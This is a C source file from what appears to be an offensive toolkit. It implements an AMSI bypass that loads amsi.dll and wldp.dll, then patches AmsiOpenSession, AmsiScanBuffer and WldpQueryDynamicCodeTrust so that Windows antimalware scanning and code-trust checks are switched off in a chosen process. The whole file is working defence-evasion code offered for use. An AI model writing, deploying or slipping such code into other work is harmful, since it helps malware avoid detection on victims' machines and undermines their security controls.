#include "amsi_bypass.h"

BOOL applyAmsiBypass(HANDLE hProcess) {
    if (hProcess == NULL)
        hProcess = NtCurrentProcess();

    DebugPrint("\n<========     AMSI Bypass [PID - %d]     ========>\n", GetProcessId(hProcess));
    
#if defined(JNE_BASED_AMSI_PATCH)
    if (!LoadLibraryA("amsi.dll")) {
        printf("[!] LoadLibrary amsi.dll Failed With Error: %ld \n", GetLastError());
        return -1;
    }

    if (!LoadLibraryA("wldp.dll")) {
        printf("[!] LoadLibrary wldp.dll Failed With Error: %ld \n", GetLastError());
        return -1;
    }

    if(!JnePatchAmsiFunction((PBYTE)GetProcAddress(GetModuleHandle(TEXT("AMSI")), "AmsiOpenSession"))) {
        DebugPrint("[!] Failed to patch AmsiOpenSession function.\n");
        return FALSE;
    }
    if(!JnePatchAmsiFunction((PBYTE)GetProcAddress(GetModuleHandle(TEXT("AMSI")), "AmsiScanBuffer"))) {
        DebugPrint("[!] Failed to patch AmsiScanBuffer function.\n");
        return FALSE;
    }
    if(!JnePatchAmsiFunction((PBYTE)GetProcAddress(GetModuleHandle(TEXT("WLDP")), "WldpQueryDynamicCodeTrust"))) {
        DebugPrint("[!] Failed to patch WldpQueryDynamicCodeTrust function.\n");
        return FALSE;
    }
    DebugPrint("[+] AMSI Bypass applied successfully using JNE patch!\n");
#else
    DebugPrint("[!] No AMSI Technique selected\n");
    DebugPrint("===================================================>\n\n");
    return TRUE;
#endif
    
    DebugPrint("[+] AMSI Bypass applied successfully!\n");
    DebugPrint("<===================================================>\n\n");
    return TRUE;
}